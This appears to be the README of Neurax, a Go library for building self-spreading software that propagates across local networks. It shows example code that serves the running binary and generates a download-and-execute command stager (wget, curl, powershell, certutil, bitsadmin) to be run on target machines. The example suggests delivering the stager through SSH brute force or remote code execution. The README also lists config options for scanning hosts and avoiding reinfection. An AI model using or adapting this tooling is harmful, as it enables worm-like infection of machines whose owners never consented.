<h1 align="center"> Neurax </h1> <br>

<p align="center">
  <a>
    <img alt="Neurax" title="Neurax" src="neurax.png">
  </a>
</p>

<p align="center"> A library that aids in creation of self-spreading software</p>

## Usage
With help of Neurax, Golang binaries can spread on local network without using any external servers.

Diverse config options and command stagers allow rapid propagation across various wireless environments.
### Example code

```go
package main
import "github.com/redcode-labs/Neurax"

func main(){

  //Specify serving port and stager to use
  neurax_config.port = 5555
  neurax_config.stager = "wget"

  //Start a server that exposes the current binary in the background
  go neurax_server()
  
  //Create a command stager that should be launched on target machine
  //It will download, decode and execute the binary
  cmd_stager := neurax_stager()

  /* Now you have to somehow execute the command generated above.
     You can use SSH bruteforce, some RCE or whatever else you want ;> */

}
```

### List of config entries

```
neurax_config.stager           - Name of the command stager to use (default: random, platform-compatible)
                                 Available stagers: certutil, powershell, bitsadmin, wget, curl
neurax_config.port             - Port to serve on (default: random from 2222 to 9999)
neurax_config.platform         - Platform to target, currently only Windows and Linux (default: detected automatically)
neurax_config.path             - The path under which binary is saved on the host (default: random)
neurax_config.file_name        - Name under which downloaded binary should be served and then saved (default: random)
neurax_config.base64           - Encode the transferred binary in base64 (default: false)
neurax_config.prevent_reinfect - Indicates whether port 7123 should be opened to prevent multiple infections of the same host (default: true)
neurax_config.required_port    - Neurax_scan() treats host as active only when it has a specific port opened (default: none)
neurax_config.scan_passive     - Neurax_scan() detects hosts using passive ARP monitoring (default: false)
neurax_config.cidr             - Neurax_scan() scans this CIDR (default: local IP + "\24")
neurax_config.threads          - Number of threads to use for neurax_scan() (default: 10)
neurax_config.full_range       - Neurax_scan() scans all ports of target host to determine if it is active (default: from 19 to 300)
```

### Finding new targets
Function `neurax_scan(c chan string)` enables detection of active hosts on local network.
It accepts a channel of type string as it's only argument and should be launched as a goroutine.
Any scanned host will be sent through that channel as soon as it was classified as active.
Host is treated as active when it has at least 1 open port + fullfils conditions specified within `neurax_config`.

## Artwork credits

====> [Seto01](https://www.deviantart.com/seto01/art/New-disease-parasite-438032692) <====

## License
This software is under [MIT license](https://en.wikipedia.org/wiki/MIT_License)
